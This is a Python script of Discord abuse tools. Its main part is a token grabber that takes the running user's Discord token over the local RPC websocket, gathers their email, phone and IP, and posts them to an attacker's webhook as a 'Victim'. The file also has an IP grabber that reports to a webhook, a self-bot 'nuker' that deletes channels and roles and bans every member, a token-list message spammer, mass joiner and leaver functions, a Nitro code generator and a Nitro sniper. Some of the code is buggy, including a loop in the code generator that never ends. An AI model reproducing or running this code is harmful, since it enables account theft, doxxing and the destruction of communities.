import requests, random, string, aiohttp, json, asyncio, socket, sys, discord, os, unidecode, numpy
from discord_webhooks import DiscordWebhooks
import discord
from discord.ext import commands
from colorama import Fore, init, Style
from datetime import datetime
init()

def CheckTokens(filename,useragent):
    Valid = 0
    Invalid = 0
    error = 0
    headers={'User-Agent': useragent}
    with open(filename,'r',encoding='utf8') as f:
        for line in f:
            token = line.strip("\n")
            r = requests.get(f'https://discordapp.com/api//sso?token={token}', headers=headers)
            if r.status_code == 400:
                print(f"{Fore.GREEN}{token}")
            elif r.status_code == 401:
                print(f"{Fore.RED}{token}")
            elif r.status_code == 329:
                print(f"{Fore.RED}RateLimit By CloudFare Service")
                print(r)
                print(r.text)
            else:
                print(f"{Fore.RED}Something Wrong, I think api patched")
                print(r)
                print(r.text)

def GenerateNitro(filename,amount):
    count=0
    while count <= amount:
        gen = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        code = f"https://discord.gift/{gen}"
        file = open(filename,'a',encoding='utf8')
        file.write(code+"\n")
    print(f"{Fore.GREEN}Genereted {amount} Nitro With Succes")

def TokenGrabber(WEBHOOK):
    async def Token():
        async with aiohttp.ClientSession() as session:
            async with session.ws_connect('ws://127.0.0.1:6463/?v=1&encoding=json', headers={'origin': 'https://discord.com'}, max_msg_size=0) as discordWS: 
                await discordWS.send_str(json.dumps({'cmd': 'SUBSCRIBE', 'args': {}, 'evt': 'OVERLAY', 'nonce': 1}))
                await discordWS.send_str(json.dumps({'cmd': 'OVERLAY', 'args': {'type': 'CONNECT', 'pid': 0}, 'nonce': 1}))
                async for message in discordWS:
                    try: return message.json()['data']['payloads'][0]['token']
                    except: continue
    
    Token = asyncio.get_event_loop().run_until_complete(Token())
    def getdeveloper():
        try:
            dev = "@WannaBeSkid * discordxapi"
            return dev
        except:
            dev = "Github: WannaBeSkid"
    
    headers = {
        "Content-Type": "application/json",
        "Authorization": Token
    }
    def GetIP():
        IP = requests.get("https://api.my-ip.io/ip.txt").text
        return IP
    def GetInfo(ContentType):
        headers = {
            "Content-Type": "application/json",
            "Authorization": Token
        }
        r = requests.get("https://discordapp.com/api/v6/users/@me", headers=headers).json()
        return r[ContentType]
    developer = getdeveloper()
    username = GetInfo("username")
    discriminator = GetInfo("discriminator")
    token = Token
    email = GetInfo("email")
    phone = GetInfo("phone")
    uid = GetInfo("id")
    AccountName = username + "#" + discriminator
    aid = GetInfo("avatar")
    PFP = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    IP = GetIP()
    webhook = DiscordWebhooks(WEBHOOK)
    webhook.set_content(content='@everyone', title='DiscordTools Victim', color=0xbb2024)
    webhook.set_footer(text=f'Dislog(Grabber) By - {developer}')
    webhook.add_field(name='Successfully Logged', value=AccountName, inline=True)
    webhook.add_field(name='User ID', value=uid, inline=True)
    webhook.add_field(name='IP Address', value="||" + IP + "||", inline=True)
    webhook.add_field(name='Email', value=email, inline=True)
    webhook.add_field(name='Phone', value=phone, inline=True)
    webhook.add_field(name='Token', value="||" + token + "||", inline=False)
    webhook.set_footer(text=f'Dislog By - {developer}', inline=True)
    webhook.send()
    sys.exit()


def SelfNukeBot(token,prefix):
    client = commands.Bot(command_prefix = prefix, self_bot=True)
    @client.event
    async def on_ready():
        await client.change_presence(activity=discord.Game(name='my game'))
        activity = discord.Activity(name=f'{prefix}help', type=discord.ActivityType.playing)
        await client.change_presence(activity=activity)
    
    client.remove_command('help')
    
    @client.command()
    async def help(ctx):
        embed = discord.Embed(description=f"**delete_channel** - deletes all channels\n**ban_all** - bans all users\n**role_spam** - spams roles\n**role_delete** - deletes all roles\n**channel_spam** - spams channels", color=ctx.author.color, delete_after=3)
        embed.set_image(url="https://cdn.discordapp.com/avatars/422438353066000384/a_5342d6d31b255eccc980022e47c499e7.gif?size=128")
        await ctx.send(embed=embed)
    
    @client.command()
    async def delete_channel(ctx):
        await ctx.send(f"Nuking server", delete_after=3)
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()    
            except:
                pass
        await ctx.guild.create_text_channel(name=f"Nuked by X Nuker")
    @client.command()
    async def ban_all(ctx):
        await ctx.send(f"Banning all users", delete_after=3)
        for user in list(ctx.guild.members):
            try:
                await user.ban()
            except:
                pass   
    @client.command()
    async def role_delete(ctx):
        await ctx.send(f"Deleting all roles", delete_after=3)
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
            except:
                pass
    @client.command()
    async def role_spam(ctx, name):
        await ctx.send(f"Spamming roles", delete_after=3)
        for _i in range(250):
            await ctx.guild.create_role(name=f"{name}")
    @client.command()
    async def channel_spam(ctx, name):
        await ctx.send(f"Spamming channels", delete_after=3)
        for _i in range(250):
            await ctx.guild.create_text_channel(name=f"{name}")
    @client.event
    @client.event
    async def on_command_error(ctx, error):
        await ctx.send(f"Command not found!", delete_after=3)
    client.run(token, bot=False)

def AccountInfo(token):
    try:
        import requests
    except:
        print("Missing requests module | pip install requests")

    r = requests.get('https://discord.com/api/v6/users/@me', headers = {'Authorization': token, 'Content-Type': 'application/json'})
    if r.status_code == 200:
        pass
    elif r.status == 401:
        print("Token is Invalid")
    else:
        print("Something going wrong")
    try:
        userID = r.json()['id'] #
    except KeyError:
        userID = "None"
        pass
    try:
        userEMAIL = r.json()['email'] #
    except KeyError:
        userEMAIL = "None"
        pass
    try:
        userPHONE = r.json()['phone'] #
    except KeyError:
        userPHONE = "None"
        pass
    try:
        userNAME = r.json()['username'] #
    except KeyError:
        userNAME = "None"
        pass
    try:
        userAVATAR_HASH = r.json()['avatar'] #
    except KeyError:
        userAVATAR_HASH = "SNone"
        pass
    userMFA = r.json()['mfa_enabled'] #
    userVERIFIED = r.json()['verified'] #
    userNSFW = r.json()['nsfw_allowed'] #
    userAVATAR_HASH = r.json()['avatar'] #
    try:
        userNITRO = r.json()['premium_type'] #
    except KeyError:
        userNITRO = "None"
        pass
    userACCOUNT_LANGUAGE = r.json()['locale'] #
    userDISCRIMINATOR = r.json()['discriminator'] #
    if userAVATAR_HASH == "SNone":
        userAVATAR_HASH == "None"
        pass
    else:
        userAVATAR_LINK = f"https://cdn.discordapp.com/avatars/{userID}/{userAVATAR_HASH}.png"
        avatar_request = requests.get(userAVATAR_LINK)
        if avatar_request == 415:
            userAVATAR_LINK = f"https://cdn.discordapp.com/avatars/{userID}/{userAVATAR_HASH}.gif"
        elif avatar_request == 304 or 200:
            userAVATAR_LINK = f"https://cdn.discordapp.com/avatars/{userID}/{userAVATAR_HASH}.png"
        else:
            pass
    print(f"User Name          : {userNAME}\nUser Discriminator : {userDISCRIMINATOR}\nUser ID            : {userID}\nUser Phone         : {userPHONE}\nUser Email         : {userEMAIL}\nUser MFA           : {userMFA}\nUser Verified      : {userVERIFIED}\nUser NSFW          : {userNSFW}\nUser Nitro         : {userNITRO}\nUser Language      : {userACCOUNT_LANGUAGE}\nUser Avatar        : {userAVATAR_LINK}")

def TokenSpammer(filename,channel_id,message,amount):
	tokens = open(filename,'r',encoding='utf8')
	content = tokens.readlines()
	f = len(content)
	c = amount / f
	tokens.close()
	x = 0
	while x < c:
	    for token in tokens:
	    	rqs = requests.post(f'https://discordapp.com/api/v8/channels/{channel_id}/messages', json={"content": message,"tts": "false"}, headers={'authorization': token})
	    	response_data = rqs.json()
	    	if rqs.status_code == 200:
	    		print(f"{Fore.RED}[{Fore.RESET}{Fore.LIGHTBLACK_EX}Sended{Fore.RED}]{Fore.RESET}{Fore.GREEN}Sended Message With Succes")
	    	elif rqs.status_code == 401:
	    		print(f"{Fore.RED}[{Fore.RESET}{Fore.LIGHTBLACK_EX}Failed{Fore.RED}]{Fore.RESET} {Fore.RED}Token is invalid")
	    	elif rqs.status_code == 403:
	    		print(f"{Fore.RED}[{Fore.RESET}{Fore.LIGHTBLACK_EX}Failed{Fore.RED}]{Fore.RESET}{Fore.RED}"+response_data["message"])
	    	else:
	    		print(f"{Fore.RED}[{Fore.RESET}{Fore.LIGHTBLACK_EX}Failed{Fore.RED}]{Fore.RESET} {Fore.RED}Something is wrong")
	    x +=1

def Joiner(filename,invite):
    tokens = open(filename,'r',encoding='utf8').read().splitlines()
    for token in tokens:
        joiner_rqs = requests.post(f'https://discordapp.com/api/v8/invites/{invite}', headers={'authorization': token})
        if joiner_rqs.status_code == 200:
            print(f"{Fore.GREEN}Succesfully Joined ")
        elif joiner_rqs.status_code == 404:
            print(f"{Fore.RED}Unknow Invite ")
        elif joiner_rqs.status_code == 429:
            print(f"{Fore.RED}RateLimit ")
        else:
            print(f"{Fore.RED}Something Wrong ")


def Leaver(filename,server_id):
	tokens = open(filename,'r',encoding='utf8').read().splitlines()
	for token in tokens:
		leaver_rqs = requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{server_id}', headers={'authorization': token})
		print(f"{Fore.GREEN}Succesfully Leaved")

def NitroSniper(token):
    client = commands.Bot(command_prefix = "$", self_bot = True)
    @client.event
    async def on_ready():
        print(Fore.LIGHTCYAN_EX + '        \t\t\t\t     Sniping Discord Nitro on ' + str(len(client.guilds)) + ' Servers \n' + Fore.RESET)
        print()

    @client.event
    async def on_message(message):
        if "discord.gift/" in message.content:
            code = message.content.split('discord.gift/')[1].split(' ')[0]
            payload = {"channel_id": str(message.channel.id)}
            headers = {"authorization": token, "content-type": "application/json"}
            r = requests.post(f"https://discord.com/api/v8/entitlements/gift-codes/{code}/redeem", headers=headers, data=json.dumps(payload))
            if r.status_code == 200:
                print(unidecode.unidecode(f"{Fore.GREEN}{Style.BRIGHT}Sent by {message.author} - Server {message.guild} - Status Successfully Claimed{Fore.RESET}{Style.RESET_ALL}: {code}"))
            elif r.status_code == 400:
                print(unidecode.unidecode(f"{Fore.RED}{Style.BRIGHT}Sent by {message.author} - Server {message.guild} - Status Already Claimed{Fore.RESET}{Style.RESET_ALL}: {code}"))
            else:
                print(unidecode.unidecode(f"{Fore.RED}{Style.BRIGHT}Sent by {message.author} - Server {message.guild} - Status Unknow Gift{Fore.RESET}{Style.RESET_ALL}: {code}"))

    client.run(token, bot = False)


def WebhookDeleler(webhook):
    r = requests.delete(webhook)
    if r.status_code == 204:
        print(f"{Fore.GREEN}Deleted Webhook With Succes")
    else:
        print(f"{Fore.RED}ERROR cannot delete webhook")

def IpGrabber(webhook):
    msg = "```New Ip Are Grabbed\n\n"
    for item, data in (requests.get('http://ip-api.com/json/')).json().items():
        msg += f"{item}: {data}\n"
    
    msg += "\nIp Grabber By github.com/XinOnGithub + github.com/Monst3red```"
    requests.post(webhook, data={"content":f'{msg}',"username":"Discord Ip Grabber"})